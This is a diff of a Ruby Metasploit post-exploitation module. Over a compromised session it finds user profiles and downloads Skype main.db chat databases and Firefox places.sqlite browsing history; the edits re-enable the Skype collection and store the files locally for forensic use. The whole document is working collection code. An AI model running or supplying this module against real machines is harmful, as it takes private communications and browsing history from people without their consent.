@@ -41,22 +41,24 @@ class Metasploit3 < Msf::Post
   #Generic Ruby Stuff for my personal reference
  
   def run
-    print_status("Hello from Metasploit! ")
-       grab_user_profiles().each do |p|
+    print_status("Hello from Metasploit! It is a pleasure to serve you today.")
+    print_status("Grabbing User Profile Data...")
+      grab_user_profiles().each do |p|
 
-  # SKYPE W3RKS.  COMMENTING OUT FOR NOW
+    print_status("Checking for Skype...")
   #Check for Skype      
-  #        if check_skype(p['AppData'],p['UserName'])
-  #          db_in_loot = download_db(p)
-  #        end
+    if check_skype(p['AppData'],p['UserName'])
+      artifact_download = download_db(p)
+    end
 
   #Check for Firefox (Mozilla folder)
-      
-          if check_firefox(p['AppData'],p['UserName'])
-            db_in_loot = download_firefox(p)
-          end
-       
+    print_status("Checking for Firefox...")     
+    if check_firefox(p['AppData'],p['UserName'])
+      artifact_download = download_firefox(p)
+    print_status("All done, Sir.")
     end
+    end   
+    
   end
   
 def check_skype(path, user)
@@ -79,21 +81,19 @@ def check_skype(path, user)
   end
 
 
-    # Download Skype's main.db file using Meterpreter functionality and return path in loot for the file
+    # Download Skype's main.db using store_local to preserve filename and some forensic metadata and make it easier to use with forensics software
   def download_db(profile)
     if session.type =~ /meterpreter/
       file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
     else
       file = cmd_exec("mdfind","-onlyin #{profile['dir']} -name main.db").split("\n").collect {|p| if p =~ /Skype\/\w*\/main.db$/; p; end }.compact
     end
-
-    file_loc = store_loot("skype.config",
+ 
+    file_loc = store_local("skypedb",
         "binary/db",
         session,
-        "main.db",
-        "Skype Configuration database for #{profile['UserName']}"
-      )
-
+        "#{profile['UserName']}_skype_main.db"
+        )
     file.each do |db|
       if session.type =~ /meterpreter/
         maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
@@ -114,7 +114,7 @@ def check_skype(path, user)
         end
         output.close
       end
-      print_good("Configuration database saved to #{file_loc}")
+      print_good("Skype history database saved to #{file_loc}")
     end
     return file_loc
   end
@@ -140,12 +140,12 @@ def check_skype(path, user)
     return false
   end
  
-  # Download Firefox places.sqlite
+    # Download Firefox History file using store_local to preserve filename and some forensic metadata and make it easier to use with forensics software
 
   def download_firefox(profile)
-        if session.type =~ /meterpreter/
-          guid = session.fs.search("#{profile['AppData']}\\Mozilla","/\w.default/",true)
-      file = session.fs.file.search("#{profile['AppData']}\\Mozilla\\#{guid}","places.sqlite",true)
+    if session.type =~ /meterpreter/
+          #guid = session.fs.search("#{profile['AppData']}\\Mozilla","/\w.default/",true)
+      file = session.fs.file.search("#{profile['AppData']}\\Mozilla\\Firefox","places.sqlite",true)
 
       
     else
@@ -153,15 +153,20 @@ def check_skype(path, user)
     end
 
 # Using store_local instead of store_loot to attempt to preserve some semblance of forensic metadata.
-
-    file_loc = store_local("firefox.history",
+    file.each do |db|
+      guid = db['path'].split ('\\') 
+#      print_error("guid last= #{guid.last}")
+      file_loc = store_local("firefoxhistory",
         "binary/db",
         session,
-        "#{profile['UserName']}_places.sqlite"
+        "#{profile['UserName']}_#{guid.last}"
        )
-    file.each do |db|
+#       print_error("file_loc=#{file_loc.to_s}")
       if session.type =~ /meterpreter/
         maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
+        
+#        print_error("db = #{db.to_s}")
+        
         print_status("Downloading #{maindb}")
         session.fs.file.download_file(file_loc,maindb)
       else
@@ -179,8 +184,8 @@ def check_skype(path, user)
         end
         output.close
       end
-      print_good("Configuration database saved to #{file_loc}")
+      print_good("Firefox History database saved to #{file_loc}")
+      return file_loc
     end
-    return file_loc
   end
 end
